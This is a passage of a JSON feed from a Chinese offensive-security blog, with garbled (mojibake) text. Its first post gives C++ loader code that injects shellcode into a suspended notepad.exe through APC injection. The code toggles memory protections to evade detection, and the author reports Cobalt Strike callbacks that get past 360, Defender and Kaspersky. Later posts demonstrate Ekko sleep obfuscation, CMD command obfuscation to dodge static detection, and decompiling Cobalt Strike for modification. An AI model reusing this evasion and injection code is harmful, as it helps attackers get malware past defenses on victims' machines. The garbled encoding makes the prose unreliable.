class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker,<span class=\"string\">&quot;/subsystem:\\&quot;Windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> fish[<span class=\"number\">307910</span>] = &#123;......&#125;   <span class=\"comment\">//sgnåçš„shellcode</span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* text_path = <span class=\"string\">&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* CreateP = <span class=\"string\">&quot;CreateProcessA&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* VirPro = <span class=\"string\">&quot;VirtualProtect&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* VirAloc = <span class=\"string\">&quot;VirtualAllocEx&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* WriteMem = <span class=\"string\">&quot;WriteProcessMemory&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span>* QueAPC = <span class=\"string\">&quot;QueueUserAPC&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">BOOL</span><span class=\"params\">(WINAPI* pCreateProcessA)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPCSTR                lpApplicationName,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPSTR                 lpCommandLine,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tBOOL                  bInheritHandles,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tDWORD                 dwCreationFlags,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPVOID                lpEnvironment,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPCSTR                lpCurrentDirectory,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">LPVOID</span><span class=\"params\">(WINAPI* pVirtualAllocEx)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tHANDLE hProcess,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPVOID lpAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tSIZE_T dwSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tDWORD  flAllocationType,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tDWORD  flProtect</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">BOOL</span><span class=\"params\">(WINAPI* pVirtualProtect)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPVOID lpAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tSIZE_T dwSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tDWORD  flNewProtect,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tPDWORD lpflOldProtect</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">BOOL</span><span class=\"params\">(WINAPI* pWriteProcessMemory)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tHANDLE  hProcess,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPVOID  lpBaseAddress,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tLPCVOID lpBuffer,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tSIZE_T  nSize,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tSIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">DWORD</span><span class=\"params\">(WINAPI* pQueueUserAPC)</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tPAPCFUNC  pfnAPC,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tHANDLE    hThread,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\tULONG_PTR dwData</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">GoHere</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\tSTARTUPINFO si = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\tPROCESS_INFORMATION pi = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\tsi.cb = <span class=\"built_in\">sizeof</span>(STARTUPINFO);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHMODULE hKernel32 = <span class=\"built_in\">GetModuleHandleW</span>(<span class=\"string\">L&quot;kernel32.dll&quot;</span>);</span><br><span class=\"line\">\tpCreateProcessA MyCreateProcess = (pCreateProcessA)<span class=\"built_in\">GetProcAddress</span>(hKernel32, CreateP);</span><br><span class=\"line\">\tpVirtualAllocEx MyVirtualAlloc = (pVirtualAllocEx)<span class=\"built_in\">GetProcAddress</span>(hKernel32, VirAloc);</span><br><span class=\"line\">\tpVirtualProtect MyVirProtect = (pVirtualProtect)<span class=\"built_in\">GetProcAddress</span>(hKernel32, VirPro);</span><br><span class=\"line\">\tpWriteProcessMemory MyWriteMen = (pWriteProcessMemory)<span class=\"built_in\">GetProcAddress</span>(hKernel32, WriteMem);</span><br><span class=\"line\">\tpQueueUserAPC MyQueueAPC = (pQueueUserAPC)<span class=\"built_in\">GetProcAddress</span>(hKernel32, QueAPC);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">MyCreateProcess</span>(text_path, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class=\"line\">\tLPVOID lpBaseeAddresss = (LPVOID)<span class=\"built_in\">MyVirtualAlloc</span>(pi.hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0X400200</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD oldProtect;</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">986</span>; i++);</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">777</span>; i++);</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">321</span>; i++);</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">123</span>; i++);</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">256</span>; i++);</span><br><span class=\"line\">\t<span class=\"built_in\">MyVirProtect</span>(lpBaseeAddresss, <span class=\"keyword\">sizeof</span> fish, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">Sleep</span>(<span class=\"number\">15000</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">MyWriteMen</span>(pi.hProcess, lpBaseeAddresss, (LPVOID)fish, <span class=\"built_in\">sizeof</span>(fish), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">MyQueueAPC</span>((PAPCFUNC)lpBaseeAddresss, pi.hThread, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">ResumeThread</span>(pi.hThread);</span><br><span class=\"line\">\t<span class=\"built_in\">CloseHandle</span>(pi.hThread);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//å·¥å…·ç”Ÿæˆçš„junkCodeè¿›è¡Œå¡«å……ï¼Œå¤ªé•¿äº†å°±ä¸å†™äº†</span></span><br></pre></td></tr></table></figure><br />\n ç¼–è¯‘å®Œåè¿˜å¯ä»¥è¿›ä¸€æ­¥æ“ä½œï¼Œæ¯”å¦‚æ›¿æ¢ ico å›¾æ ‡ï¼Œæ·»åŠ ä¼ªç­¾åç­‰ç­‰ã€‚è¿™é‡Œæˆ‘åªè¿›è¡Œå›¾æ ‡çš„æ›¿æ¢æµ‹è¯•äº† 360 (æ ¸æ™¶æ¨¡å¼)ã€windowDefinder (ä¸ªäººç‰ˆã€ä¼ä¸šç‰ˆã€ä¸“ä¸šç‰ˆ)ã€å¡å·´æ–¯åŸº (å…è´¹ç‰ˆ)ï¼Œå…¶ä¸­é™¤äº† wdf ä¸“ä¸šç‰ˆæ— æ³•ä¸Šçº¿ä¹‹å¤–å…¶ä»–éƒ½èƒ½åšåˆ°æ— æ„Ÿä¸Šçº¿ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥æ‰§è¡Œ shell å‘½ä»¤ (å½“ç„¶è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ cs4.9 å¹¶ä¸”é…ç½®äº† C2profile æœ‰ä¸€å®šçš„æµé‡è§„é¿æ•ˆæœ)ã€‚</p>\n<p><strong>360 æ ¸æ™¶</strong>ï¼š<img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnl0tgyj31c00u0gs7.jpg\" alt=\"\" /><br />\n<strong>wdf (çœŸå®ç¯å¢ƒè¿œç¨‹ä¸Šçº¿ ==&gt; æ‰§è¡Œ screenshot)</strong>ï¼š<img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqr5hiihj316c0pi7an.jpg\" alt=\"\" /><br />\n<strong>å¡å·´æ–¯åŸº</strong>ï¼š<img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnosm7hj31u70u0dqa.jpg\" alt=\"\" /><br />\n<strong>360 æ€æ¯’ + 360 æ ¸æ™¶ä¼šæŠ¥è­¦å‘Šæç¤º</strong></p>\n<h5 id=\"ekkoç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤º\"><a class=\"anchor\" href=\"#ekkoç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤º\">#</a> Ekko ç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤ºï¼š</h5>\n<p>è¯¥é¡¹ç›®ä¹Ÿæ˜¯ havoC2 çš„ä½œè€…çš„ï¼Œå·²ç»é›†æˆåœ¨äº† havoc ä¸Šï¼Œåœ¨è¿™æˆ‘ä»¬å•ç‹¬æŠŠè¿™ä¸ªé¡¹ç›®è¿è¡Œçœ‹çœ‹ï¼Œå°† github ä¸Šçš„é¡¹ç›®æ‹‰å–åˆ°æœ¬åœ°å³å¯ï¼Œç¼–è¯‘å™¨ç”¨çš„æ˜¯ visual studio2022ã€‚å…¶æ··æ·†åŸç†ç®€å•æ¥è¯´å°±æ˜¯åœ¨ä¸€ä¸ªå‘¨æœŸå†…ç¡çœ ç»“æŸåçš„å‡ åæ¯«ç§’å†…å°†å†…å­˜ä¸­ä»£ç æ®µè¿›è¡Œå¼‚æˆ–æ¢å¤åˆ°æ­£å¸¸åŠŸèƒ½ä»£ç ï¼Œå¹¶åŒæ—¶æ¢å¤ RX å±æ€§ã€‚<br />\næˆ‘ä»¬éœ€è¦å…³æ³¨çš„ä»£ç æ®µå°±åœ¨ Ekko.c ä¸­ï¼Œè¿™é‡Œæˆ‘ä»¬å•ç‹¬æç‚¼å‡ºæ¥ï¼š<br />\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ImageBase = <span class=\"built_in\">GetModuleHandleA</span>(<span class=\"literal\">NULL</span>);     <span class=\"comment\">//è·å–å½“å‰è¿›ç¨‹åŸºå€</span></span><br><span class=\"line\"><span class=\"comment\">//è·å–è¯¥æœ¬è¿›ç¨‹å†…å­˜é•œåƒå¤§å°</span></span><br><span class=\"line\">PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class=\"line\">DWORD e_lfanew = dosHeader-&gt;e_lfanew;</span><br><span class=\"line\">PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((<span class=\"type\">char</span>*)ImageBase + e_lfanew);</span><br><span class=\"line\">ImageSize = ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//ImageSize = 0x0005e6b4;</span></span><br></pre></td></tr></table></figure><br />\n è¿™é‡Œè·å–å†…å­˜é•œåƒå¤§å°çš„ä»£ç æˆ‘åšäº†ä¿®æ”¹ï¼ŒåŸé¡¹ç›®çš„ä»£ç åœ¨æˆ‘æœ¬åœ°è¿è¡Œæ—¶è·å–åˆ°çš„å¤§å°å§‹ç»ˆä¸º 0ï¼Œæš‚æ—¶ä¹Ÿä¸æ¸…æ¥šä»€ä¹ˆæƒ…å†µã€‚<br />\nè¿™é‡Œæˆ‘ä»¬ä¿®æ”¹å®Œåå†ç¼–è¯‘å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ messagebox æ¥æ¨¡æ‹Ÿ c2 æœåŠ¡ç«¯å‘é€çš„æŒ‡ä»¤ï¼Œä½¿ç”¨<strong> ProcessHacker</strong> ç›‘æ§å†…å­˜å˜æ¢ã€‚</p>\n<p><em><strong>éç¡çœ æ—¶é—´æ®µ (äº‹ä»¶ç­‰å¾…æ—¶é—´æ®µ)ï¼š</strong></em><br />\n<img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpvp4d5wtj31cz0u0x05.jpg\" alt=\"\" /><br />\n<em><strong>ç¡çœ æ··æ·†æ—¶é—´æ®µï¼š</strong></em><br />\n<img data-src=\"https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hrpvp7ovgyj31cu0u0aux.jpg\" alt=\"\" /></p>\n",
            "tags": [
                "å…æ€",
                "å…æ€"
            ]
        },
        {
            "id": "https://shut-td.github.io/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/",
            "url": "https://shut-td.github.io/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/",
            "title": "CMDå‘½ä»¤æ··æ·†",
            "date_published": "2024-04-02T16:53:28.000Z",
            "content_html": "<h3 id=\"èƒŒæ™¯\"><a class=\"anchor\" href=\"#èƒŒæ™¯\">#</a> èƒŒæ™¯</h3>\n<p>å½“æˆ‘ä»¬è·å– shell æˆ–è€…è¿æ¥åˆ°è¿œæ§æ—¶ï¼Œç›´æ¥æ‰§è¡Œé«˜å±æ“ä½œä¼šè¢«æ‹¦æˆªå› æ­¤éœ€è¦åšå‘½ä»¤ä¸Šçš„æ··æ·†æ¥è¾¾åˆ°é™æ€å…æ€çš„æ•ˆæœã€‚</p>\n<h5 id=\"1-è½¬ä¹‰ç¬¦å·è¿æ¥\"><a class=\"anchor\" href=\"#1-è½¬ä¹‰ç¬¦å·è¿æ¥\">#</a> 1ã€è½¬ä¹‰ç¬¦å·è¿æ¥</h5>\n<p>å³åœ¨å‘½ä»¤ä¸­é€šè¿‡å¡«å……  ^  è¯¥ç¬¦å·è¿›è¡Œæ··æ·†<br />\n <figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">w</span><span class=\"symbol\">^h</span><span class=\"symbol\">^o</span><span class=\"symbol\">^am</span><span class=\"symbol\">^i</span></span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hoczg4gntcj30dk02pglk.jpg\" alt=\"\" /><br />\n<strong> æ³¨æ„è¿™é‡Œä¸€æ¬¡åªèƒ½ç”¨ä¸€ä¸ª ^ è¿›è¡Œè¿æ¥</strong></p>\n<h5 id=\"2-åˆ©ç”¨setè®¾ç½®å˜é‡å¹¶ä½¿ç”¨è¿ç»­æ‰§è¡Œè¾¾åˆ°æ··æ·†æ•ˆæœ\"><a class=\"anchor\" href=\"#2-åˆ©ç”¨setè®¾ç½®å˜é‡å¹¶ä½¿ç”¨è¿ç»­æ‰§è¡Œè¾¾åˆ°æ··æ·†æ•ˆæœ\">#</a> 2ã€åˆ©ç”¨ set è®¾ç½®å˜é‡å¹¶ä½¿ç”¨ &amp;&amp; è¿ç»­æ‰§è¡Œè¾¾åˆ°æ··æ·†æ•ˆæœ</h5>\n<p><figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span> gg=wh&amp;&amp;<span class=\"built_in\">%gg</span><span class=\"built_in\">%oami</span></span><br><span class=\"line\">å†åŠ ä¸Š<span class=\"number\">1</span>çš„æ“ä½œ</span><br><span class=\"line\"><span class=\"keyword\">set</span> gg=<span class=\"keyword\">w</span><span class=\"symbol\">^h</span>^&amp;&amp;<span class=\"built_in\">%gg</span><span class=\"built_in\">%oa</span><span class=\"symbol\">^mi</span></span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hocznijn5cj30ei023weh.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hocznwfke0j30fq02jdfu.jpg\" alt=\"\" /></p>\n<h5 id=\"3-åŒå¼•å·åŒ…è£¹\"><a class=\"anchor\" href=\"#3-åŒå¼•å·åŒ…è£¹\">#</a> 3ã€åŒå¼•å·åŒ…è£¹</h5>\n<p><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;</span>wh<span class=\"string\">&quot;&quot;</span>o<span class=\"string\">&quot;ami&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;&quot;w&quot;&quot;&quot;</span><span class=\"string\">&quot;h^o&quot;</span><span class=\"string\">&quot;am^i</span></span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoczp72g9fj30c202swef.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hoczplami2j30dw02et8o.jpg\" alt=\"\" /></p>\n<h5 id=\"4-æ‹¬å·åŒ…è£¹\"><a class=\"anchor\" href=\"#4-æ‹¬å·åŒ…è£¹\">#</a> 4ã€æ‹¬å·åŒ…è£¹</h5>\n<p><figure class=\"highlight cos\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">((((((whoami))))))</span><br><span class=\"line\">æ··åˆæœ‰é™åªèƒ½ä¸­é—´å’Œ ^ é…åˆ</span><br><span class=\"line\">((((((<span class=\"keyword\">w</span><span class=\"symbol\">^h</span><span class=\"symbol\">^o</span><span class=\"symbol\">^a</span><span class=\"symbol\">^m</span><span class=\"symbol\">^i</span>))))))</span><br></pre></td></tr></table></figure><br />\n<img data-src=\"https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoczqr3468j30ea02et8p.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hoczr5q7d6j30fg02kt8q.jpg\" alt=\"\" /></p>\n<h5 id=\"5-unicodeæ›¿æ¢éé€šç”¨\"><a class=\"anchor\" href=\"#5-unicodeæ›¿æ¢éé€šç”¨\">#</a> 5ã€Unicode æ›¿æ¢ (éé€šç”¨)</h5>\n<p>Ê± Ê° Ê² Ê³ Ê· Ê¸ Ë¢ Ë£ Ë¡<br />\nÊ· ä¿®é¥°å­—æ¯å°å†™ W<br />\nÊ¸ ä¿®é¥°å­—æ¯å°å†™ Y<br />\nÊ° ä¿®é¥°å­—æ¯å°å†™ H<br />\nÊ± å¸¦é’©çš„ä¿®é¥°å­—æ¯å°å†™ H<br />\nÊ² ä¿®é¥°å­—æ¯å°å†™ J<br />\nÊ³ ä¿®é¥°å­—æ¯å°å†™ R<br />\nË¡ ä¿®é¥°å­—æ¯å°å†™ L<br />\nË¢ ä¿®é¥°å­—æ¯å°å†™ S<br />\nË£ ä¿®é¥°å­—æ¯å°å†™ X<br />\n è¿™ä¸ªä¸å¤ªè¡Œï¼Œé€‚ç”¨æ€§å¤ªçª„</p>\n<p>è¿™ä¹Ÿæ˜¯æˆ‘çªå‘å¥‡æƒ³è¯•äº†å°†è¿‘åŠä¸ªå¤šå°æ—¶è¯•å‡ºæ¥æ€»ç»“å‡ºæ¥çš„ï¼Œç»“æœä¸Šç½‘ä¸€æŸ¥æ—©å°±æœ‰å¤§ä½¬æ€»ç»“å¥½äº† (emo äº†ï½) è´´ä¸ªé“¾æ¥æŠŠ ==&gt; <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmV0d29yay8yOTEwMjAuaHRtbA==\">https://www.freebuf.com/articles/network/291020.html</span></p>\n",
            "tags": [
                "æ”»é˜²æŠ€å·§",
                "æ”»é˜²æŠ€å·§"
            ]
        },
        {
            "id": "https://shut-td.github.io/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/",
            "url": "https://shut-td.github.io/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/",
            "title": "æºç åç¼–è¯‘åŠæ­å»ºé—®é¢˜[CSäºŒå¼€ç³»åˆ—]",
            "date_published": "2024-03-31T18:35:14.000Z",
            "content_html": "<h3 id=\"æºç çš„åç¼–è¯‘åŠæ­å»º\"><a class=\"anchor\" href=\"#æºç çš„åç¼–è¯‘åŠæ­å»º\">#</a> æºç çš„åç¼–è¯‘åŠæ­å»º</h3>\n<p>æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯ jadx è¿›è¡Œçš„åç¼–è¯‘ï¼Œå› æ­¤åé¢ä¼šæœ‰ä¸€äº›ä»£ç ä¸Šçš„å‘éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚<br />\næ–°å»ºå¦‚ä¸‹å›¾çš„ç›®å½•ç»“æ„ï¼Œå¹¶å°†åŸå§‹çš„ CSjar åŒ…æ”¾è¿› cs_bin å³å¯ã€‚</p>\n<p><img data-src=\"https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hoaqyt5couj30me04874r.jpg\" alt=\"\" /></p>\n<p>ä½¿ç”¨ jadx åç¼–è¯‘å®Œåå¯¼å‡ºä¸º graddle é¡¹ç›®è‡³ cs_src ç›®å½•ä¸­å³å¯è·å–æºç å³ä¸‹å›¾ä¸¤ä¸ªæ–‡ä»¶å¤¹ã€‚</p>\n<p><img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hoar1cl14pj30m8036mxd.jpg\" alt=\"\" /></p>\n<p>ç„¶åæ‰“å¼€ IDEA æ–°å»ºä¸€ä¸ªç©ºé¡¹ç›®å¹¶æ–°å»ºä¸€ä¸ª decompiled_src ç›®å½•ï¼Œå¹¶å°† source ç›®å½•å¤åˆ¶å…¥ decompiled_src å³å¯ï¼Œåç»­æ“ä½œå‚è€ƒè¿™ç¯‡<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzM3ODUzMy5odG1s\">äºŒå¼€æ­å»º</span>çš„æ–‡ç« ã€‚</p>\n<p>åœ¨è¿™é‡Œä¸»è¦è®²ä¸‹å¯èƒ½æ˜¯ jadx åç¼–è¯‘çš„é—®é¢˜å¯¼è‡´çš„åç¼–è¯‘åçš„æºä»£ç æœ‰äº›åœ°æ–¹ä¼šå‡ºé”™éœ€è¦æ‰‹åŠ¨æ›´æ­£ä¸€ä¸‹ï¼Œè¿™é‡Œä¸¾å‡ ä¸ªä¾‹å­ï¼š<br />\n<img data-src=\"https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hoar8i6pgnj30mv0a0wg6.jpg\" alt=\"\" /><br />\nè¿™é‡ŒæŠ¥é”™çš„åŸå‹æ˜¯è¿™æ®µä»£ç ï¼š<br />\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (Map.Entry entry : <span class=\"built_in\">this</span>.hooks.entrySet())&#123;</span><br><span class=\"line\">\t.......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n è¿™é‡Œåªéœ€è¦è·Ÿè¿› <code>this.hooks.entrySet()</code>  è§‚å¯Ÿä¸€ä¸‹è¿”å›çš„ç±»å‹æ˜¯ä»€ä¹ˆå³å¯ï¼Œæ¯”å¦‚è¿™é‡Œè·Ÿè¿›ä¹‹åå‘ç°æ˜¯ä¸ª Set é›†åˆï¼Œåœ¨å¤–é¢ç”¨ Set 